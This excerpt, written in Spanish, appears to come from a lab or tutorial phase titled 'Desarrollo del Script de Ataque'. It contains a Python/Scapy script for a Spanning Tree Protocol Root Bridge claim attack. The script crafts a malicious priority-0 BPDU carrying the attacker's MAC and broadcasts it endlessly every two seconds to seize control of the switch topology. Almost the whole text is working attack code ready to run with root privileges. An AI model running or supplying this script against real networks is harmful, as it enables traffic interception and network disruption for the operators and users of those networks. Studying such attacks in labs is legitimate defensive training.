...
### Fase 2: Desarrollo del Script de Ataque
...
Autor: [Tu nombre]
Fecha: 13/02/2026
Descripción: Script para realizar un ataque de Root Bridge utilizando Scapy
"""
...
def craft_malicious_bpdu(attacker_mac):
    """
    Construye una BPDU maliciosa con prioridad 0
    
    Args:
        attacker_mac (str): Dirección MAC del atacante
    
    Returns:
        packet: Paquete BPDU construido
    """
    # Dirección multicast STP
    stp_multicast = "01:80:c2:00:00:00"
    
    # Capa 2 - Ethernet 802.3
    dot3 = Dot3(dst=stp_multicast, src=attacker_mac)
    
    # LLC (Logical Link Control)
    llc = LLC(dsap=0x42, ssap=0x42, ctrl=0x03)
    
    # BPDU Configuration
    # Priority 0 = Máxima prioridad (Root Bridge)
    stp = STP(
        rootid=0,                      # Root Priority: 0
        rootmac=attacker_mac,          # MAC del atacante como Root
        bridgeid=0,                    # Bridge Priority: 0
        bridgemac=attacker_mac,        # MAC del atacante como Bridge
...
def launch_attack(interface, count=None):
    """
    Lanza el ataque de STP Root Bridge
    
    Args:
        interface (str): Interfaz de red a utilizar
        count (int): Número de paquetes a enviar (None = infinito)
    """
    # Obtener MAC de la interfaz
    try:
        attacker_mac = get_if_hwaddr(interface)
    except:
        print(f"{Colors.FAIL}[!] Error: No se pudo obtener la MAC de {interface}{Colors.ENDC}")
        sys.exit(1)
    
    print(f"{Colors.OKGREEN}[+] Interfaz: {interface}{Colors.ENDC}")
    print(f"{Colors.OKGREEN}[+] MAC Atacante: {attacker_mac}{Colors.ENDC}")
    print(f"{Colors.WARNING}[*] Fingiendo ser el Root Bridge con MAC: {attacker_mac}{Colors.ENDC}")
    print(f"{Colors.WARNING}[*] BPDU de prioridad 0 enviada. Manteniendo el control...{Colors.ENDC}\n")
    
    # Construir BPDU maliciosa
    malicious_bpdu = craft_malicious_bpdu(attacker_mac)
    
    # Mostrar información del paquete
    print(f"{Colors.OKCYAN}[*] Lanzando STP Claim Root Attack...{Colors.ENDC}")
    
    # Enviar paquetes
    packet_count = 0
    try:
        while count is None or packet_count < count:
            sendp(malicious_bpdu, iface=interface, verbose=False)
            packet_count += 1
            
            if packet_count % 10 == 0:
                print(f"{Colors.OKBLUE}[+] BPDU de prioridad 0 enviada. Manteniendo el control... (Paquetes: {packet_count}){Colors.ENDC}")
            
            time.sleep(2)  # Enviar cada 2 segundos (Hello Time)
            
    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}[!] Ataque detenido por el usuario{Colors.ENDC}")
        print(f"{Colors.OKGREEN}[+] Total de BPDUs enviadas: {packet_count}{Colors.ENDC}")
...
def main():
    ...
    if os.geteuid() != 0:
        print(f"{Colors.FAIL}[!] Este script requiere permisos de root{Colors.ENDC}")
        print(f"{Colors.WARNING}[*] Ejecuta: sudo python3 {sys.argv[0]}{Colors.ENDC}")
        sys.exit(1)
    
    # Interfaz de red (ajustar según tu entorno)
    interface = "eth0"  # Cambiar según tu configuración
    
    # Lanzar ataque
    print(f"{Colors.HEADER}[*] Iniciando ataque STP Root Bridge...{Colors.ENDC}\n")
    launch_attack(interface)
